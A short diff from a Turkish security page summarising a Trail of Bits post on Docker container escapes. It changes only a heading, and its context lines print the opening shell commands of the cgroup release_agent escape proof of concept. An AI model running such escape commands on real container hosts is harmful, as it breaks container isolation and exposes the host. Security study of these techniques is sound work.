@@ -4,7 +4,7 @@
 
 **Daha fazla ayrıntı için, lütfen** [**orijinal blog yazısına**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** bakın.** Bu sadece bir özet:
 
-Orijinal PoC:
+Original PoC:
 ```shell
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
